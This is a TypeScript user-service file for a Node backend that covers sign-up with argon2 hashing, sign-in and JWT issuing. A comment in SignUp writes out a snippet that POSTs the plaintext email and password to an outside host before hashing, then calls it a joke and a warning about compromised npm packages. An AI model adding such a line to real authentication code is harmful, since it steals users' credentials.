import Container, { Service } from 'typedi';

import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import jwt from 'jsonwebtoken';
import config from '@/config.mjs';

import { IUserDTO } from '../dto/IUserDTO';
import { UserMap } from '../mappers/UserMap';
import IUserService from './IServices/IUserService';

import IRoleRepo from './IRepos/IRoleRepo';
import IUserRepo from './IRepos/IUserRepo';

import { User } from '../domain/user/user';
import { UserEmail } from '../domain/user/userEmail';
import { UserPassword } from '../domain/user/userPassword';

import { Role } from '../domain/role/role';

import { PhoneNumber } from '@/domain/user/phoneNumber';
import { Result } from '../core/logic/Result';

@Service()
export default class UserService implements IUserService {
  private userRepo: IUserRepo;
  private roleRepo: IRoleRepo;

  constructor() {
    this.userRepo = Container.get(config.repos.user.name);
    this.roleRepo = Container.get(config.repos.role.name);
  }

  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail(userDTO.email);
      const found = !!userDocument;

      if (found) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(
          'User already exists with email=' + userDTO.email
        );
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */

      const salt = randomBytes(32);
      const hashedPassword = await argon2.hash(userDTO.password, { salt });

      const password = UserPassword.create({
        value: hashedPassword,
        hashed: true
      }).getValue();
      const email = UserEmail.create(userDTO.email).getValue();
      const phoneNumber = PhoneNumber.create(userDTO.phoneNumber).getValue();

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure)
        return Result.fail<{ userDTO: IUserDTO; token: string }>(roleOrError.error);

      const role = roleOrError.getValue();

      const userOrError = User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        phoneNumber,
        email,
        role,
        password
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      const token = this.generateToken(userResult);

      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO(userResult) as IUserDTO;
      return Result.ok<{ userDTO: IUserDTO; token: string }>({
        userDTO: userDTOResult,
        token: token
      });
    } catch (e) {
      console.log(e);
      throw e;
    }
  }

  public async SignIn(
    email: string,
    password: string
  ): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
    const user = await this.userRepo.findByEmail(email);

    if (!user) {
      throw new Error('User not registered');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    const validPassword = await argon2.verify(user.password.value, password);
    if (validPassword) {
      const token = this.generateToken(user) as string;

      const userDTO = UserMap.toDTO(user) as IUserDTO;
      return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTO, token: token });
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user: User) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.id.toValue();

    return jwt.sign(
      {
        id,
        email, // We are gonna use this in the middleware 'isAuth'
        role,
        firstName,
        lastName,
        exp: exp.getTime() / 1000
      },
      config.jwtSecret
    );
  }

  private async getRole(roleId: string): Promise<Result<Role>> {
    const role = await this.roleRepo.findByDomainId(roleId);
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }
}
